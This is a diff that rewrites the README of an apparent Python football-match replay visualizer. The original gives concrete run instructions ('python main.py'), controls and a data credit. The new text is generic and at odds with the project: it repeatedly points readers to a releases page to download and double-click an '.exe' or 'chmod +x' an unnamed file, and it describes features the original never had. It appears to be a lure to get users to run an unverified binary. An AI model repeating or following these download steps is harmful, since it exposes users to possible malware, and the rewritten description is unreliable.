@@ -1,65 +1,95 @@
-# Football Match Replay Visualizer ⚽🥅
+# ⚽ Football-Match-Replay - Visualize Football Match Data Easily
 
-**Top football clubs like Liverpool and Chelsea use tracking data to win matches.** They analyze player movements to perfect tactics, spot weaknesses, and make data driven decisions to improve their overall performance.
-This project processes **145K real match frames** from Metrica Sports so you can see exactly how the pros do it, right on your computer.
+[![Download Football-Match-Replay](https://img.shields.io/badge/Download-Football--Match--Replay-brightgreen)](https://github.com/sreedham793/Football-Match-Replay/releases)
 
-[![demo.gif](demo.gif)](demo.gif)
-<img width="1498" height="1005" alt="Screenshot 2025-11-30 214511" src="https://github.com/user-attachments/assets/8761ea2f-6e2e-4475-8f78-6be359f3ba2b" />
+## 📋 Description
 
+Football-Match-Replay helps you visualize 25Hz tracking data. With this tool, you can enjoy an interactive replay of 145K real match frames from Metrica Sports. Dive deep into the dynamics of football games and analyze the action like a pro.
 
-## Features
+## 🚀 Getting Started
 
-- **Match Replay Visualization**: Watch 22 players + ball move in real-time on animated pitch
-- **Live Player Tracking**: Home (blue) vs Away (red) teams with 145K frames @ 25Hz
-- **Interactive Controls**: Pause (SPACE), rewind/fast-forward (←→ arrow keys)
-- **Real Match Data**: 96-minute full match from Metrica Sports sample dataset
-- **Frame-Accurate Replay**: 25 FPS animation processing 8M+ data points
-- **Demo Generator**: `make_demo.py` creates shareable 15s highlight GIFs
+Follow these simple steps to get up and running. 
 
-## Controls
+1. **Check Your System Requirements**
+   - Operating System: Windows, macOS, or Linux.
+   - Python version: 3.6 or higher.
+   - Memory: At least 4GB RAM.
+   - Disk Space: Minimum of 500MB free space.
 
-- **Pause/Resume**: `SPACE`
-- **Rewind/Fast Forward**: `←` / `→` arrow keys
-- **Restart**: Hold `R`
+2. **Download the Application**
+   - Visit the [Releases page](https://github.com/sreedham793/Football-Match-Replay/releases) to download the latest version of Football-Match-Replay. 
 
-## Requirements
+3. **Installing the Application**
+   - After downloading, locate the file in your Downloads folder.
+   - If your operating system is Windows, double-click the `.exe` file to start the installation. Mac users should drag the application to the Applications folder. Linux users may need to change permissions using `chmod +x yourfile` from the terminal.
 
-- Python 3.10+
-- [Pandas](https://pandas.pydata.org/) (data processing)
-- [Matplotlib](https://matplotlib.org/) (animation)
-- [NumPy](https://numpy.org/) (arrays)
-- [Pillow](https://pillow.readthedocs.io/) (GIF export)
-- [Kloppy](https://kloppy.readthedocs.io/) (sports data)
+4. **Running the Application**
+   - Open the application by double-clicking the icon.
+   - You may need to allow permissions if prompted.
 
-``pip install -r requirements.txt``
+## 📥 Download & Install
 
-## Usage
+To begin your journey with Football-Match-Replay, visit the following link and choose the most recent release to download:
 
-Run the interactive replay:
+[Download Football-Match-Replay](https://github.com/sreedham793/Football-Match-Replay/releases)
 
-`python main.py`
+Once downloaded, follow the installation steps provided earlier.
 
-Generate demo GIF (15 seconds):
+## 🛠️ How to Use the Application
 
-`python make_demo.py`
+1. **Opening Tracking Data**
+   - You can upload your tracking data files through the interface. Make sure the format is compatible (e.g., CSV).
 
+2. **Navigating the Replay Interface**
+   - Use the toolbar to play, pause, or rewind the matches.
+   - Zoom in and out to get a closer look at specific plays.
 
-## Customization
+3. **Analyzing Performance**
+   - The application displays player movements and actions during the game.
+   - Use provided metrics to evaluate team strategies.
 
-- **Pitch dimensions/colors**: `src/arcade_replay.py`
-- **Player markers/trails**: `animate()` method
-- **Playback speed**: `interval=40` (milliseconds)
-- **Demo length**: `range(0, 375, 5)` in `make_demo.py`
+4. **Exporting Visuals**
+   - Once you finish your analysis, export the visuals for presentations or reports.
 
-## License
+## 🔍 Features
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+- **Interactive Visualizations:** Get engaging graphics that represent match data.
+- **User-Friendly Interface:** Designed with simplicity in mind for all levels of users.
+- **Compatibility:** Works seamlessly on major operating systems.
 
-## Disclaimer
+## 🌐 Community and Support
 
-No copyright infringement intended. Metrica Sports data used for educational purposes only under fair use. All trademarks belong to their respective owners.
+If you have questions or need assistance, feel free to reach out. You can join our community and participate in discussions.
 
----
+- **Issues Page:** Report any problems you encounter while using the app.
+- **Feature Requests:** Have an idea to improve Football-Match-Replay? Share it on the issues page.
 
-**Built with ❤️ for football enthusiasts**  
-**Data: [Metrica Sports Sample Data](https://github.com/metrica-sports/sample-data)**
+## 🥇 Topics
+
+Explore related topics that enhance your understanding:
+
+- data
+- data-science
+- data-visualization
+- football
+- football-analytics
+- match-analysis
+- matplotlib
+- pandas
+- python
+- replay-visualizer
+- soccer
+- sports
+- sports-analytics
+- sports-data
+- sports-tech
+- tracking-data
+- visualization
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/sreedham793/Football-Match-Replay/releases)
+- [Documentation](https://github.com/sreedham793/Football-Match-Replay/wiki)
+- [Community Discussions](https://github.com/sreedham793/Football-Match-Replay/discussions)
+
+Enjoy analyzing football matches like never before with Football-Match-Replay!
